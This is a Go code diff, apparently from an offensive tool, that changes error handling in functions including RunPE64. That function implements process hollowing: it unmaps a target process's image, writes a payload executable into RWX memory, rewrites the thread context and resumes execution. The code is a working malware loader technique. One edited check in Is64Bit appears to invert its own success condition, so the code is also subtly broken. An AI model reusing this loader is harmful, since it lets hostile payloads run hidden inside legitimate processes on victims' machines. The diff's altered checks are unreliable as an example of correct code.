@@ -15,8 +15,6 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-const errSuccess string = "The operation completed successfully."
-
 func SelectRandomElement(array []uint32) int {
 	randomIndex := rand.Intn(len(array))
 	chosen := array[randomIndex]
@@ -48,7 +46,7 @@ func Is64Bit(pid uint32) int {
 
 	pHandle, err := OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, pid)
 
-	if err.Error() == errSuccess {
+	if err != windows.Errno(0) {
 		bitness := IsWow64Process(pHandle)
 		CloseHandle(pHandle)
 		return int(bitness)
@@ -160,14 +158,14 @@ func RunPE64(payload []byte, target string, commandLine string) {
 	ctx.ContextFlags = CONTEXT_FULL
 
 	err = GetThreadContext(threadHandle, ctx)
-	if err != nil && err.Error() != SUCCESS {
+	if err != nil && err != windows.Errno(0) {
 		fmt.Println(err)
 	}
 
 	// Get Base Address
 	data := make([]byte, 8)
 	_, err = ReadProcessMemory(processHandle, uintptr(ctx.Rdx+16), data, 8)
-	if err != nil && err.Error() != SUCCESS {
+	if err != nil && err != windows.Errno(0) {
 		fmt.Println(err)
 	}
 
@@ -175,7 +173,7 @@ func RunPE64(payload []byte, target string, commandLine string) {
 
 	// Get headers of payload
 	f, err := pe.NewFile(bytes.NewReader(payload))
-	if err != nil && err.Error() != SUCCESS {
+	if err != nil && err != windows.Errno(0) {
 		fmt.Println(err)
 	}
 
@@ -186,7 +184,7 @@ func RunPE64(payload []byte, target string, commandLine string) {
 
 	// Unmap current executable.
 	_, err = NtUnmapViewOfSection(processHandle, baseAddress)
-	if err != nil && err.Error() != SUCCESS {
+	if err != nil && err != windows.Errno(0) {
 		fmt.Println(err)
 	}
 
@@ -194,7 +192,7 @@ func RunPE64(payload []byte, target string, commandLine string) {
 	newImageBase := VirtualAllocEx2(processHandle, baseAddress, (uintptr)(optionalHeader.SizeOfImage), 0x00002000|0x00001000, 0x40)
 
 	_, err = WriteProcessMemory2(processHandle, newImageBase, payload, optionalHeader.SizeOfHeaders)
-	if err != nil && err.Error() != SUCCESS {
+	if err != nil && err != windows.Errno(0) {
 		fmt.Println(err)
 	}
 
@@ -202,11 +200,11 @@ func RunPE64(payload []byte, target string, commandLine string) {
 	for _, section := range f.Sections {
 
 		sectionData, err := section.Data()
-		if err != nil && err.Error() != SUCCESS {
+		if err != nil && err != windows.Errno(0) {
 			panic(err)
 		}
 		_, err = WriteProcessMemory2(processHandle, newImageBase+(uintptr)(section.VirtualAddress), sectionData, section.Size)
-		if err != nil && err.Error() != SUCCESS {
+		if err != nil && err != windows.Errno(0) {
 			fmt.Println(err)
 		}
 	}
@@ -215,7 +213,7 @@ func RunPE64(payload []byte, target string, commandLine string) {
 	newImageBytes := make([]byte, 8)
 	binary.LittleEndian.PutUint64(newImageBytes, uint64(newImageBase))
 	_, err = WriteProcessMemory2(processHandle, uintptr(ctx.Rdx+16), newImageBytes, 8)
-	if err != nil && err.Error() != SUCCESS {
+	if err != nil && err != windows.Errno(0) {
 		fmt.Println(err)
 	}
 
@@ -224,12 +222,12 @@ func RunPE64(payload []byte, target string, commandLine string) {
 
 	// Update thread context.
 	err = SetThreadContext(threadHandle, *ctx)
-	if err != nil && err.Error() != SUCCESS {
+	if err != nil && err != windows.Errno(0) {
 		fmt.Println(err)
 	}
 
 	err = ResumeThread(threadHandle)
-	if err != nil && err.Error() != SUCCESS {
+	if err != nil && err != windows.Errno(0) {
 		fmt.Println(err)
 	}
 }
